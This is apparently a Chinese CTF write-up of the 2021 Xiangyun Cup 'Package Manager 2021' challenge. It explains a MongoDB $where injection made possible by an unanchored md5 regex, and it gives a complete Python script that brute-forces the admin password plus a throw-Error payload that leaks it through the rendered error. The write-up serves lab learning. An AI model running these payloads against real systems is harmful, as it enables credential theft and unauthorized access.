---
title: '[2021祥云杯]Package Manager 2021'
date: 2024-11-04 22:12:38
tags: 
      - mongodb注入
      - js抛出异常
categories: 刷题笔记
---

## [2021祥云杯]Package Manager 2021

## mongodb注入

我们通过schema.ts发现这是一个mangodb数据库

Mongoose是一个让我们可以通过Node来操作MongoDB数据库的模块

**![image-20241105150319480](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411051503623.png)**

然后再index中的/auth路由找到了sql注入漏洞

<!--more-->

```js
router.get('/auth', (_, res) => res.render('auth'))

router.post('/auth', async (req, res) => {
	let { token } = req.body;
	if (token !== '' && typeof (token) === 'string') {
		if (checkmd5Regex(token)) {
			try {
				//这里存在sql注入漏洞
				let docs = await User.$where(`this.username == "admin" && hex_md5(this.password) == "${token.toString()}"`).exec()
				console.log(docs);
				if (docs.length == 1) {
					if (!(docs[0].isAdmin === true)) {
						return res.render('auth', { error: 'Failed to auth' })
					}
				} else {
					return res.render('auth', { error: 'No matching results' })
				}
			} catch (err) {
				return res.render('auth', { error: err })
			}
		} else {
			return res.render('auth', { error: 'Token must be valid md5 string' })
		}
	} else {
		return res.render('auth', { error: 'Parameters error' })
	}
	req.session.AccessGranted = true
	res.redirect('/packages/submit')
});

```

虽然在token之前要经过checkmd5Regex函数的检测，我们来跟进这个函数

```js
const checkmd5Regex = (token: string) => {
  return /([a-f\d]{32}|[A-F\d]{32})/.exec(token);
}

```

在正则匹配时，没有用^$匹配头部或者尾部，所以存在绕过

## 第一种方法：爆破密码

我们构造token:`aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"||this.password[0]=="a`使得括号内的值为

```js
this.username == "admin" && hex_md5(this.password) == "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" || this.password[0]=="a"
```

此时只要或条件成立语句就为真，写个脚本就可以爆出密码啦

```python
import requests
import string

url="http://d8ec246d-507e-4aaa-a226-d318473d31ec.node4.buuoj.cn:81/auth"
headers={
    "Cookie": "session=s%3Ay8Ne8sPLeY55QXmWPyh3WmPiuoDgOp6y.U3VuzJCBxWcb5AWW8CCkPJqnSmYJ1N9EnHvoR%2BBuGho",
}

flag = ''
for i in range(10000):
    for j in string.printable:
        if j == '"':
            continue
        payload='aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"||this.password[{}]=="{}'.format(i,j)
        data={
            "_csrf": "YzvJKLZc-4Sp0gfSn-hIRIF4bUZu0nhXy0HU",
            "token": payload
        }
        r=requests.post(url=url,data=data,headers=headers,allow_redirects=False)
        # print(r.text)
        if "Found. Redirecting to" in r.text:
            print(payload)
            flag+=j
            print(flag)
            break
```

爆出密码

```
!@#&@&@efefef*@((@))grgregret3r
```

我们用admin账户登录得到flag

![image-20241105152239438](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411051522530.png)

## 第二种方法：异常注入

同样的是对auth接口这里逻辑判断，利用了js的抛出异常和IIFE（立即调用函数表达式）来实现

```
token=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"||(()=>{throw Error(this.password)})()=="admin
```

逻辑判断语句为：

```
this.username == "admin" && hex_md5(this.password) == "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"||(()=>{throw Error(this.password)})()!="aaaaa"
```

这里就是立即执行throw Error(this.password)，后面是!=还是== 字符串的值是什么都无所谓，只要是语法没问题然后语句正常执行，这里强制抛出异常，从源码中可以看到抛出的异常会被渲染出来，然后就能够看到password的值

```javascript
let docs = await User.$where(`this.username == "admin" && hex_md5(this.password) == "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"||(()=>{throw Error(this.password)})()=="admin""`).exec()
console.log(docs);
```

![image-20241105152613967](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411051526000.png)

参考

https://blog.csdn.net/RABCDXB/article/details/124810618

https://cloud.tencent.com/developer/article/2070199
